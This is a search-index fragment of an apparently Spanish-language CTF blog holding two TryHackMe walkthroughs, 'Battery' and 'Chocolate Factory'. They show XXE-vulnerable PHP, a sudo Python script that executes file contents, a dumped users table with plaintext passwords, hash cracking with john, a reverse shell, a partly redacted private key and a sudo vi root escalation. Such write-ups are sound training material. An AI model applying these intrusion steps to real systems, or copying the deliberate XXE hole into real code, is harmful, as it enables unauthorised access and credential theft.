\u0026lt;/ul\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;fieldset\u0026gt; \u0026lt;p\u0026gt; \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;Account Number\u0026lt;/label\u0026gt; \u0026lt;input id=\u0026#34;name\u0026#34; name=\u0026#34;name\u0026#34; type=\u0026#34;text\u0026#34; value=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;label for=\u0026#34;search\u0026#34;\u0026gt;Remark\u0026lt;/label\u0026gt; \u0026lt;input id=\u0026#34;search\u0026#34; name=\u0026#34;search\u0026#34; type=\u0026#34;text\u0026#34; value=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;button name=\u0026#34;snd\u0026#34; id=\u0026#34;Login\u0026#34; onclick=\u0026#34;XMLFunction()\u0026#34;\u0026gt;Send Message\u0026lt;/button\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;?php session_start(); if(isset($_SESSION[\u0026#39;favcolor\u0026#39;]) and $_SESSION[\u0026#39;favcolor\u0026#39;]===\u0026#34;admin@bank.a\u0026#34;) { libxml_disable_entity_loader (false); $xmlfile = file_get_contents(\u0026#39;php://input\u0026#39;); $dom = new DOMDocument(); $dom-\u0026gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $info = simplexml_import_dom($dom); $name = $info-\u0026gt;name; $search = $info-\u0026gt;search; echo \u0026#34;Sorry, account number $search is not active!\u0026#34;; } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;Only Admins can access this page!\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; session_destroy(); unset($_SESSION[\u0026#39;favcolor\u0026#39;]); header(\u0026#34;Refresh: 0.1; url=index.html\u0026#34;); } ?\u0026gt; CYBER - USER Utilizamos las credenciales que encontramos en el servicio SSH y logramos obtener una shell y nuestra primera flag flag1.txt.\nPRIVILEGE ESCALATION Realizamos una enumeracion con este usuario y encontramos que puede ejecutar un script de python con sudo.\nA simple vista vemos un \u0026ldquo;efecto\u0026rdquo; de escritura, al investigar sobre este efecto encontramos que es posible realizarlo con las librerias sys y time, para comprobar esto y obtener informacion paramos el script utilizando CTRL + C. Y logramos ver que dicho script esta utilizando la libreria time.\n1 2 3 4 5 6 7 8 9 10 cyber@ubuntu:~$ sudo /usr/bin/python3 /home/cyber/run.py Hey Cyb^CTraceback (most recent call last): File \u0026#34;/home/cyber/run.py\u0026#34;, line 17, in \u0026lt;module\u0026gt; main(); File \u0026#34;/home/cyber/run.py\u0026#34;, line 12, in main delay_print(\u0026#34;Hey Cyber I have tested all the main components of our web server but something unusal happened from my end!\u0026#34;); File \u0026#34;/home/cyber/run.py\u0026#34;, line 8, in delay_print time.sleep(0.08) KeyboardInterrupt cyber@ubuntu:~$ Tambien realizamos una enumeracion utilizando pspy para ver si ejecutaba algun otro programa, y logramos ver que reinicia el servicio de apache cada vez que es ejecutado el script.\nEl problema es que no tenemos permisos de escritura o lectura sobre el archivo, pero como el archivo está dentro de la carpeta cyber podemos cambiar de nombre y eliminar dicho archivo, creamos uno nuevo con una shell inversa y lo ejecutamos con sudo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 cyber@ubuntu:~$ ls -lah total 1.2M drwx------ 3 cyber cyber 4.0K Jan 20 06:14 . drwxr-xr-x 4 root root 4.0K Nov 16 15:28 .. -rw------- 1 cyber cyber 0 Nov 17 19:47 .bash_history -rw-r--r-- 1 cyber cyber 220 Nov 9 21:06 .bash_logout -rw-r--r-- 1 cyber cyber 3.6K Nov 9 21:06 .bashrc drwx------ 2 cyber cyber 4.0K Nov 9 21:52 .cache -rw--w---- 1 cyber cyber 85 Nov 15 16:45 flag1.txt -rw-r--r-- 1 cyber cyber 675 Nov 9 21:06 .profile -rwx------ 1 root root 349 Nov 15 18:33 run.py cyber@ubuntu:~$ ls -ld . drwx------ 3 cyber cyber 4096 Jan 20 06:14 . cyber@ubuntu:~$ Logramos obtener una shell con usuario root y nuestra flag root.txt y tambien flag2.txt.\nANEXO CYBER ENUM Dentro del archivo auth.log encontramos algunos comandos ejecutados y un script en la carpeta del usuario yash, tambien informacion de un servicio FTP el cual no existe.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 [... REDACTED ...] Nov 16 16:59:47 ubuntu sudo: cyber : command not allowed ; TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=/usr/bin/python3 /home/cyber/run.py flag1.txt run.py Nov 16 17:00:43 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/python3 /home/cyber/run.py Nov 16 17:03:18 ubuntu sudo: yash : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/yash ; USER=root ; COMMAND=list Nov 16 17:18:59 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=list Nov 16 17:19:11 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 16 17:20:35 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 16 17:20:47 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 16 21:51:30 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=list Nov 16 21:51:55 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=/usr/bin/python3 /home/cyber/run.py Nov 16 21:56:13 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/python3 /home/cyber/run.py Nov 16 22:07:55 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=list Nov 16 22:10:47 ubuntu sudo: yash : TTY=pts/1 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 16 22:13:39 ubuntu sudo: yash : TTY=pts/1 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 17 10:37:06 ubuntu sudo: root : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/bin/chmod u+rwx emergency.py Nov 17 10:42:27 ubuntu sudo: root : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=list Nov 17 10:42:36 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=list Nov 17 10:42:50 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 17 10:43:48 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 17 10:45:47 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=list Nov 17 10:45:56 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=/usr/bin/python3 /home/cyber/run.py Nov 17 10:49:54 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=list Nov 17 10:50:03 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 17 10:50:26 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 17 12:21:11 ubuntu sudo: yash : command not allowed ; TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/apt-get install python-pip Nov 17 13:09:46 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=list Nov 17 13:09:56 ubuntu sudo: yash : TTY=pts/0 ; PWD=/home/yash ; USER=root ; COMMAND=/usr/bin/python3 /home/yash/emergency.py Nov 17 17:03:00 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=list Nov 17 17:03:51 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=/usr/bin/python3 /home/cyber/run.py Nov 17 20:22:35 ubuntu sudo: root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/touch /var/log/aws114_ssm_agent_installation.log Jan 20 05:29:10 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=list Jan 20 05:29:37 ubuntu sudo: cyber : TTY=pts/0 ; PWD=/home/cyber ; USER=root ; COMMAND=/usr/bin/python3 /home/cyber/run.py Dentro de la base de datos logramos encontrar una contraseña del usuario admin@bank.a pero no logramos conseguir nada con esta contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 cyber@ubuntu:/var$ mysql -u root -p Enter password: [... REDACTED ...] mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | details | | menagerie | | mysql | | performance_schema | +--------------------+ 5 rows in set (0.00 sec) mysql\u0026gt; use details; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; +-------------------+ | Tables_in_details | +-------------------+ | users | +-------------------+ 1 row in set (0.00 sec) mysql\u0026gt; select * from users; +--------------+--------------------+-----+--------+-----------+ | username | password | cno | amount | bank_name | +--------------+--------------------+-----+--------+-----------+ | cyber | cyber | 14 | 0 | ABC | | admin@bank.a | I_know_my_password | 15 | 0 | ABC | | admin | pass | 17 | 0 | ABC | | check | check | 19 | 0 | ABC | | admin@bank.a | batman | 20 | 0 | ABC | +--------------+--------------------+-----+--------+-----------+ 5 rows in set (0.00 sec) mysql\u0026gt; use menagerie; Database changed mysql\u0026gt; show tables; Empty set (0.00 sec) mysql\u0026gt; exit Bye ROOT ENUM Logramos confirmar que el script run.py utiliza las librerias sys,time asi mismo que reinicia el servicio apache.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 root@ubuntu:~# cat run,py cat run,py cat: run,py: No such file or directory root@ubuntu:~# cat /home/cyber/run.py.bak cat /home/cyber/run.py.bak import os,sys,time def delay_print(s): for c in s: sys.stdout.write(c) sys.stdout.flush() time.sleep(0.08) def main(): os.setuid(0); delay_print(\u0026#34;Hey Cyber I have tested all the main components of our web server but something unusal happened from my end!\u0026#34;); print(\u0026#34;\\n\u0026#34;) os.system(\u0026#39;service apache2 restart \u0026gt; /dev/null 2\u0026gt;\u0026amp;1\u0026#39;); main(); Tambien encontramos que el script (/home/yash/emergency.py) que aparece en el archivo de log auth.log existe y realiza la lectura del archivo /opt/binside.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 root@ubuntu:/home/yash# cat emergency.py cat emergency.py import os,time,sys def delay_print(s): for c in s: sys.stdout.write(c) sys.stdout.flush() time.sleep(0.04) def BinaryToDecimal(binary): string = int(binary, 2) return string str_data=\u0026#34;\u0026#34; print(\u0026#34;01110010 01100101 01100001 01100100 01101001 01101110 01100111 00100000 00101111 01101111 01110000 01110100 00101111 01100010 01101001 01101110 01110011 01101001 01100100 01100101 00100000 01100110 01101001 01101100 01100101\u0026#34;) try: with open(\u0026#39;/opt/binside\u0026#39;,\u0026#39;r\u0026#39;) as f: for p in f: for m in p.split(): inn=int(m,2) ass=chr(inn) str_data+=ass f=open(\u0026#39;/opt/binside\u0026#39;,\u0026#39;a\u0026#39;) delay_print(\u0026#34;checking if you are a human...................Test Failed [✘]\\n\\n\u0026#34;) f.write(str(os.system(str_data))) f.write(\u0026#34;\\n\u0026#34;) except Exception as e: time.sleep(4) delay_print(\u0026#34;checking if you are a human.....................Test Passed [✔]\\n\\n\u0026#34;) root@ubuntu:/home/yash# ","description":"Battery es una maquina de TryHackMe, encontramos correos dentro de un fichero y mediante SQL Truncation Attack obtuvimos acceso a un panel de administracion en donde explotamos una vulnerabilidad XXE por la cual obtuvimos credenciales de acceso. La mala configuracion de permisos en un script de python nos permitio escalar privilegios.","id":77,"section":"posts","tags":["sql truncation","xxe","python","pspy"],"title":"TryHackMe - Battery","uri":"https://sckull.github.io/posts/battery/"},{"content":"\rChocolate Factory es una maquina de TryHackMe, obtuvimos acceso a un portal crackeando un contraseñas de un backup de shadow, ejecutamos una shell inversa y obtuvimos acceso por SSH con una clave privada. Escalamos privilegios utilizando Sudo junto con Vi y finalmente para obtener nuestra ultima flag utilizamos Python.\nRoom Titulo Chocolate Factory Descripción A Charlie And The Chocolate Factory themed room, revisit Willy Wonka\u0026rsquo;s chocolate factory! Puntos 120 Dificultad Facil Maker 0x9747 saharshtapi AndyInfoSec NMAP Escaneo de puertos con nmap nos muestra varios puertos abiertos, pero nos interesan por el momento a los que podemos acceder: ftp (21), ssh (22) y http (http).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 # Nmap 7.80 scan initiated Tue Jan 19 20:53:24 2021 as: nmap -p- --min-rate 1000 -o scanPorts chocolat.thm Warning: 10.10.0.127 giving up on port because retransmission cap hit (10). Nmap scan report for chocolat.thm (10.10.0.127) Host is up (0.30s latency). Not shown: 64450 closed ports, 1056 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 100/tcp open newacct 101/tcp open hostname 102/tcp open iso-tsap 103/tcp open gppitnp 104/tcp open acr-nema 105/tcp open csnet-ns 106/tcp open pop3pw 107/tcp open rtelnet 108/tcp open snagas 109/tcp open pop2 110/tcp open pop3 111/tcp open rpcbind 112/tcp open mcidas 113/tcp open ident 114/tcp open audionews 115/tcp open sftp 116/tcp open ansanotify 117/tcp open uucp-path 118/tcp open sqlserv 119/tcp open nntp 120/tcp open cfdptkt 121/tcp open erpc 122/tcp open smakynet 123/tcp open ntp 124/tcp open ansatrader 125/tcp open locus-map # Nmap done at Tue Jan 19 20:55:58 2021 -- 1 IP address (1 host up) scanned in 153.60 seconds # Nmap 7.80 scan initiated Tue Jan 19 21:02:09 2021 as: nmap -sV -sC -o servPorts chocolat.thm Nmap scan report for chocolat.thm (10.10.0.127) Host is up (0.30s latency). Not shown: 989 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 |_auth-owners: ERROR: Script execution failed (use -d to debug) | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-rw-r-- 1 1000 1000 208838 Sep 30 14:31 gum_room.jpg | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.2.29.162 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |_auth-owners: ERROR: Script execution failed (use -d to debug) | ssh-hostkey: | 2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA) | 256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA) |_ 256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 100/tcp open newacct? |_auth-owners: ERROR: Script execution failed (use -d to debug) | fingerprint-strings: | HTTPOptions, RTSPRequest: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; [... REDACTED ...] 125/tcp open locus-map? |_auth-owners: ERROR: Script execution failed (use -d to debug) | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 8 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port100-TCP:V=7.80%I=7%D=1/19%Time=60078F67%P=x86_64-pc-linux-gnu%r(HTT SF:POptions,20F,\u0026#34;\\\u0026#34;Welcome\\x20to\\x20chocolate\\x20room!!\\x20\\r\\n\\x20\\x20\\x2 [... REDACTED ...] SF:!\\x20;\\)\\x20\\r\\nI\\x20hope\\x20you\\x20wont\\x20drown\\x20Augustus\\\u0026#34;\\x20\u0026#34;); Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jan 19 21:08:06 2021 -- 1 IP address (1 host up) scanned in 356.86 seconds FTP En el servicio FTP encontramos una imagen la cual contenia un archivo embebido codificado en base64, al decodificarlo encontramos la contraseña encriptada del usuario charlie.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 kali@kali:~/thm/chocolat$ ftp chocolat.thm Connected to chocolat.thm. 220 (vsFTPd 3.0.3) Name (chocolat.thm:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 65534 65534 4096 Oct 01 12:11 . drwxr-xr-x 2 65534 65534 4096 Oct 01 12:11 .. -rw-rw-r-- 1 1000 1000 208838 Sep 30 14:31 gum_room.jpg 226 Directory send OK. ftp\u0026gt; get gum_room.jpg local: gum_room.jpg remote: gum_room.jpg 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes). 226 Transfer complete. 208838 bytes received in 4.01 secs (50.8460 kB/s) ftp\u0026gt; exit 221 Goodbye. kali@kali:~/thm/chocolat$ file gum_room.jpg gum_room.jpg: JPEG image data, Exif standard: [TIFF image data, big-endian, direntries=0], baseline, precision 8, 1920x1080, components 3 kali@kali:~/thm/chocolat$ steghide extract -sf gum_room.jpg Enter passphrase: wrote extracted data to \u0026#34;b64.txt\u0026#34;. kali@kali:~/thm/chocolat$ head b64.txt ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6 KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4 MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5 OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3 Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6 Cmxpc3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRz Oio6MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1k LXRpbWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4MzgwOjA6 OTk5OTk6Nzo6OgpzeXN0ZW1kLXJlc29sdmU6KjoxODM4MDowOjk5OTk5Ojc6OjoKX2FwdDoqOjE4 kali@kali:~/thm/chocolat$ cat b64.txt |base64 -d daemon:*:18380:0:99999:7::: bin:*:18380:0:99999:7::: sys:*:18380:0:99999:7::: sync:*:18380:0:99999:7::: [... REDACTED ...] _gvm:*:18496:0:99999:7::: charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/[... REDACTED ...]uKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7::: kali@kali:~/thm/chocolat$ Utilizamos john para obtener la contraseña de charlie.\n1 2 3 4 5 6 7 8 9 10 11 kali@kali:~/thm/chocolat$ john --wordlist=/usr/share/wordlists/rockyou.txt charlie_hash Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status cn[... REDACTED ...]4 (charlie) 1g 0:00:06:52 DONE (2021-01-19 21:24) 0.002426g/s 2389p/s 2389c/s 2389C/s cocker6..cn123 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed kali@kali:~/thm/chocolat$ PORTS Encontramos una lista larga de puertos a los cuales realizamos una conexion pero en cada puerto mostraba el mismo mensaje junto con un posible nombre de usuario (Augustus) hasta que logramos encontrar uno donde indicaba la direccion de un archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 kali@kali:~/thm/chocolat$ nc -vvv chocolat.thm 112 chocolat.thm [10.10.0.127] 112 (?) open \u0026#34;Welcome to chocolate room!! ___ ___ ___ ___ ___.---------------. .\u0026#39;\\__\\\u0026#39;\\__\\\u0026#39;\\__\\\u0026#39;\\__\\\u0026#39;\\__,` . ____ ___ \\ \\|\\/ __\\/ __\\/ __\\/ __\\/ _:\\ |:. \\ \\___ \\ \\\\\u0026#39;\\__\\\u0026#39;\\__\\\u0026#39;\\__\\\u0026#39;\\__\\\u0026#39;\\_`.__| `. \\ \\___ \\ \\\\/ __\\/ __\\/ __\\/ __\\/ __: \\ \\\\\u0026#39;\\__\\\u0026#39;\\__\\\u0026#39;\\__\\ \\__\\\u0026#39;\\_;-----------------` \\\\/ \\/ \\/ \\/ \\/ : | \\|______________________;________________| A small hint from Mr.Wonka : Look somewhere else, its not here! ;) I hope you wont drown Augustus\u0026#34; ^C sent 0, rcvd 527 kali@kali:~/thm/chocolat$ nc -vvv chocolat.thm 113 chocolat.thm [10.10.0.127] 113 (auth) open http://localhost/key_rev_key \u0026lt;- You will find the key here!!! ^C sent 0, rcvd 62 Descargamos el archivo, encontramos que es un archivo ejecutable, al pasarle strings sobre este encontramos un \u0026ldquo;nombre\u0026rdquo; de usuario el cual utilizamos para pasarselo, lo que nos devolvio una clave.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 kali@kali:~/thm/chocolat$ file key_rev_key key_rev_key: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8273c8c59735121c0a12747aee7ecac1aabaf1f0, not stripped kali@kali:~/thm/chocolat$ strings key_rev_key /lib64/ld-linux-x86-64.so.2 [... REDACTED ...] =9 AWAVI AUATL []A\\A]A^A_ Enter your name: laksdhfas congratulations you have found the key: b\u0026#39;-VkgXhFf6s[... REDACTED ...]BXeQuvhcGSQzY=\u0026#39; Keep its safe Bad name! ;*3$\u0026#34; GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0 crtstuff.c [... REDACTED ...] kali@kali:~/thm/chocolat$ chmod +x key_rev_key kali@kali:~/thm/chocolat$ ./key_rev_key Enter your name: laksdhfas congratulations you have found the key: b\u0026#39;-VkgXhFf6sAEc[... REDACTED ...]eQuvhcGSQzY=\u0026#39; kali@kali:~/thm/chocolat$ HTTP Encontramos una pagina web con un simple login.\nRUSTBUSTER Utilizamos rustbuster para busqueda de directorios y archivos pero no encontramos mucho.\n1 2 3 4 5 6 7 8 9 10 11 ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~ [?] Started at : 2021-01-19 21:13:28 GET 200 OK http://chocolat.thm/ GET 200 OK http://chocolat.thm/home.php GET 200 OK http://chocolat.thm/index.html GET 200 OK http://chocolat.thm/index.html GET 403 Forbidden http://chocolat.thm/server-status [?] Ended at: 2021-01-19 21:19:03 WWW-DATA - USER Utilizamos las credenciales de charlie y logramos ingresar, al ingresar nos muestra un input donde es posible ejecutar comandos.\nEjecutamos una shell inversa y logramos obtener una shell con el usuario www-data.\nCHARLIE - USER Dentro de la carpeta de charlie encontramos su clave privada de SSH la cual utilizamos para obtener acceso.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 www-data@chocolate-factory:/home/charlie$ ls -lah ls -lah total 40K drwxr-xr-x 5 charlie charley 4.0K Oct 7 16:14 . drwxr-xr-x 3 root root 4.0K Oct 1 12:08 .. -rw-r--r-- 1 charlie charley 3.7K Apr 4 2018 .bashrc drwx------ 2 charlie charley 4.0K Sep 1 17:17 .cache drwx------ 3 charlie charley 4.0K Sep 1 17:17 .gnupg drwxrwxr-x 3 charlie charley 4.0K Sep 29 18:08 .local -rw-r--r-- 1 charlie charley 807 Apr 4 2018 .profile -rw-r--r-- 1 charlie charley 1.7K Oct 6 17:13 teleport -rw-r--r-- 1 charlie charley 407 Oct 6 17:13 teleport.pub -rw-r----- 1 charlie charley 39 Oct 6 17:11 user.txt www-data@chocolate-factory:/home/charlie$ ls -ld . ls -ld . drwxr-xr-x 5 charlie charley 4096 Oct 7 16:14 . www-data@chocolate-factory:/home/charlie$ cat user.txt cat user.txt cat: user.txt: Permission denied www-data@chocolate-factory:/home/charlie$ cat teleport cat teleport -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj [ ... REDACTED ... ] 37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln -----END RSA PRIVATE KEY----- www-data@chocolate-factory:/home/charlie$ Acceso a atraves del servicio ssh logramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando vi. Utilizamos vi para obtener una shell root.\nEncontramos el archivo root.py el cual pide una clave para poder desencrpitar nuestra flag, intentamos ejecutarlo en la maquina pero mostraba error, por lo que ejecutamos el archivo localmente eliminando lo innecesario y reparando el error (bytes en variable encrypted_mess).\n1 2 3 4 5 6 7 8 from cryptography.fernet import Fernet f = Fernet(\u0026#39;-VkgXhFf6sAEcA[... REDACTED ...]ABXeQuvhcGSQzY=\u0026#39;) encrypted_mess = b\u0026#39;gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5l[... REDACTED ...]_xbIQkQojwf_unpPAAKyJQDHNvQaJ\u0026#39; dcrypt_mess = f.decrypt(encrypted_mess) mess = dcrypt_mess.decode() print(mess) Ejecutamos el script y logramos obtener nuestra flag root.txt.\nEs posible de manera rapida con la clave (key) y token desencriptar la informacion con Fernet 